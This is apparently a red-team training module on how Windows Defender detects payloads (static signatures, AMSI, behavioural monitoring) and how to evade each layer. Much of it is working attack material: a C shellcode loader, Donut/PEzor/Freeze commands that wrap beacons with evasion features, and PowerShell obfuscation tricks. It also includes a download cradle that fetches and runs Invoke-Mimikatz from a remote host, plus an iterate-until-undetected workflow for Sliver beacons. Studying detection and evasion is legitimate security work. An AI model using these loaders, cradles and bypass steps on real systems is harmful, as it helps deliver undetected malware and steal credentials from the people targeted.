# Phase 03: Payload Development — How Detection Works

> **Why this phase exists**: Most beginners treat AV bypass as magic — "use this obfuscated script and it works." That approach fails when the script gets signatured. Understanding **how detection works** means you can bypass it reliably, adapt when one method fails, and understand why certain techniques evade certain controls.

**Study time**: 1 week
**Difficulty**: Intermediate

---

## Learning Objectives

- [ ] Explain the three layers of Windows Defender detection
- [ ] Explain what a signature is and how to find which bytes are triggering detection
- [ ] Build a basic shellcode loader from scratch (conceptually)
- [ ] Use Donut to convert a .NET binary to shellcode
- [ ] Use PEzor to pack and obfuscate a binary
- [ ] Test a payload against Defender and iterate until it passes

---

## 1. How Windows Defender Detects Things

Defender uses three distinct mechanisms. Understanding each separately lets you target the right bypass.

### Layer 1: Static Signature Scanning

When a file is written to disk, Defender scans it against a database of known-bad byte patterns. These signatures are maintained by Microsoft and updated frequently.

**What triggers it**: Specific byte sequences in your file — a known function name, an import table entry, a specific string, or even a sequence of opcodes.

**How to find the trigger**: ThreatCheck

```bash
# Install ThreatCheck
wget https://github.com/rasta-mouse/ThreatCheck/releases/latest/download/ThreatCheck.exe

# Run against your payload
.\ThreatCheck.exe -f beacon.exe -e Defender
# Output: shows the exact bytes that triggered the signature
# Fix those bytes → re-test
```

**Why this matters**: You don't need to rewrite the whole tool. You only need to change the flagged bytes.

### Layer 2: AMSI (Antimalware Scan Interface)

AMSI is a hook built into PowerShell, VBScript, JScript, and the .NET CLR. Before any script content is executed, the runtime calls `AmsiScanBuffer()` in `amsi.dll`. Defender's AMSI provider examines the content and returns a verdict.

**What triggers it**: Strings in scripts that match known-bad patterns. Examples:
- `"sekurlsa"` — Mimikatz component name
- `"AmsiUtils"` — AMSI utility class (ironic — it's the target of most bypasses)
- `"Invoke-Mimikatz"` — PowerShell Mimikatz wrapper
- `"SharpHound"` — BloodHound collector name

**How to find what's triggering AMSI**:

```powershell
# AMSITrigger — binary search through your script to find the exact string
.\AMSITrigger_x64.exe -i PowerView.ps1 -f 3
# Output: highlights which line/string triggers AMSI
```

**The key insight**: AMSI checks content **in memory at runtime**, not on disk. Even if your file has no signatures, if you paste known-bad strings into PowerShell, AMSI catches them. That's why AMSI bypass must happen **before** loading any detected content.

### Layer 3: Behavioral / ETW Detection

Even if you bypass static signatures and AMSI, Defender watches what processes *do*:

- Process creates an executable in `C:\Windows\Temp` → suspicious
- `powershell.exe` spawns `cmd.exe` spawns `whoami` → Office macro pattern
- A process reads LSASS memory → credential dumping pattern
- A process allocates RWX memory and writes shellcode → process injection pattern

**Event Tracing for Windows (ETW)** provides real-time telemetry that Defender and EDRs subscribe to. .NET emits ETW events for every assembly load, JIT compilation, and many other actions.

**The key insight**: Behavioral detection is the hardest to bypass because it doesn't rely on signatures — it watches for suspicious actions. The solution is to make your actions look unsuspicious (process injection into a normal process, using legitimate-looking binaries) or to patch ETW at runtime.

---

## 2. The Detection Bypass Hierarchy

Work through these in order. Start with the simplest fix that works:

```
Problem: Defender catches my payload on disk
Fix: → Obfuscate the binary (rename strings, recompile, use PEzor)
     → Or: deliver in-memory (PowerShell cradle, execute-assembly) — bypasses disk scan

Problem: AMSI catches my PowerShell script
Fix: → Bypass AMSI first (Phase 04), then load the script
     → Or: use execute-assembly instead of PowerShell

Problem: Behavioral detection catches my action (e.g., LSASS read)
Fix: → Use a stealthier method (nanodump instead of Mimikatz)
     → Or: patch ETW (Phase 04)
     → Or: inject into a trusted process first, then act from there
```

---

## 3. Shellcode Loaders — The Modern Payload Architecture

Instead of delivering `beacon.exe` as a PE (Portable Executable), modern red teams deliver raw **shellcode** inside a custom **loader**. The loader is a legitimate-looking binary that:
1. Allocates memory
2. Writes shellcode to it
3. Executes the shellcode

The loader itself contains no signatures (it's custom). The shellcode is either encrypted on disk and decrypted at runtime, or not on disk at all (downloaded and injected).

### Why this works

Defenders maintain signatures for known tools (Sliver beacons, Cobalt Strike shellcode patterns). A custom loader + encrypted shellcode has no known signature. The loader looks like any other binary.

### Conceptual loader in C (educational)

```c
#include <windows.h>

// Shellcode would be your beacon, encrypted
unsigned char shellcode[] = { 0x90, 0x90, ... }; // NOP sled + beacon

int main() {
    // Allocate RWX memory
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), 
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Copy shellcode into allocated memory
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // Execute shellcode
    ((void(*)())mem)();
    
    return 0;
}
```

**This is the simplest loader and is immediately caught by modern EDRs.** Real loaders:
- Allocate RW memory → write → change to RX (instead of RWX from the start)
- Use indirect syscalls instead of Windows API (bypasses userland hooks)
- Encrypt/encode shellcode and decrypt at runtime
- Use sleep obfuscation to encrypt memory while sleeping

### Tools that generate loaders for you

```bash
# Donut — converts .NET/PE/shellcode to position-independent shellcode
git clone https://github.com/TheWover/donut && cd donut && make
./donut -f 1 -a 2 SharpHound.exe -p "-c All --zip" -o sharpound.bin
# Now sharpound.bin is shellcode you can inject via any loader

# PEzor — automated packing with evasion options
bash install.sh
PEzor.sh -unhook -antidebug -text -syscalls -sleep=3 beacon.exe
# Creates a self-contained PE with evasion techniques applied

# Freeze (simple loader generator in Go)
git clone https://github.com/optiv/Freeze
go build -o freeze
./freeze -I beacon.bin -O loader.exe -encrypt -sandbox -sleep 3
```

---

## 4. Obfuscation for PowerShell

When your PowerShell script is caught by AMSI and you've found the triggering string:

### String splitting
```powershell
# Original (detected):
IEX (New-Object Net.WebClient).DownloadString("http://ip/Invoke-Mimikatz.ps1")

# Obfuscated:
$a = "Invoke"
$b = "-Mimikatz"
$c = $a + $b
# Or: encode the whole thing
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
powershell -EncodedCommand $enc
```

### Invoke-Obfuscation
```powershell
# Automated obfuscation tool
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielbohannon/Invoke-Obfuscation/master/Invoke-Obfuscation.ps1')
Invoke-Obfuscation
# Follow the menu: TOKEN → ALL → 1 (random substitution)
# Output: obfuscated version of your script
```

### CharCode substitution
```powershell
# Convert detected string to char codes
"sekurlsa" | ForEach-Object { [int][char]$_ }
# 115 101 107 117 114 108 115 97

# Reconstruct at runtime:
-join([char[]](115,101,107,117,114,108,115,97))
# = "sekurlsa" — assembled at runtime, not a static string
```

---

## 5. Testing Your Payload Pipeline

### The right testing workflow

```
1. Generate payload
2. Test on Windows VM with Defender ON
3. Check Windows Security event log if caught
   → Event 1116: Defender detected something
   → Note the detection name
4. Run ThreatCheck to find the exact triggering bytes
5. Fix those bytes (rename, split strings, recompile)
6. Repeat until clean
7. Document what worked
```

### Set up a test Windows VM with Windows Security Center

```powershell
# On your test Windows VM — make sure real-time protection is on:
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableIOAVProtection $false

# Update definitions to latest:
Update-MpSignature

# Check current definition version:
Get-MpComputerStatus | Select AntivirusSignatureLastUpdated, AntivirusSignatureVersion
```

**Test your payload against the latest definitions, not stale ones.** On exam day, Defender will be up to date.

---

## 6. Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: AV Evasion: Shellcode](https://tryhackme.com/room/avevasionshellcode) | THM (Sub) | Shellcode loaders, encoder basics |
| [THM: Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples) | THM (Sub) | Obfuscation techniques |
| [ired.team: Defense Evasion](https://www.ired.team/offensive-security/defense-evasion) | Free | Deep dives on specific techniques |
| Manual: ThreatCheck drill | Your lab | Find what triggers Defender in a known tool, fix it |
| Manual: Payload pipeline | Your lab | Get a Sliver beacon past Defender using 3 different methods |

---

## Phase 03 Mastery Checklist

- [ ] Can you explain the 3 detection layers (static, AMSI, behavioral) and which tool/technique bypasses each?
- [ ] Can you use ThreatCheck to find the exact bytes triggering Defender in a binary?
- [ ] Can you use AMSITrigger to find the string triggering AMSI in a script?
- [ ] Can you explain what a shellcode loader does and why it's stealthier than a raw PE?
- [ ] Can you use Donut to convert a .NET binary to injectable shellcode?
- [ ] Can you generate a Sliver beacon, test it against Defender, identify why it's caught, and fix it?
- [ ] Can you explain why AMSI catches PowerShell scripts even if the file has no disk signature?

---

## Next Phase

→ **Phase 04: AMSI, ETW & AV Bypass** — building the actual bypasses, not just understanding what they target
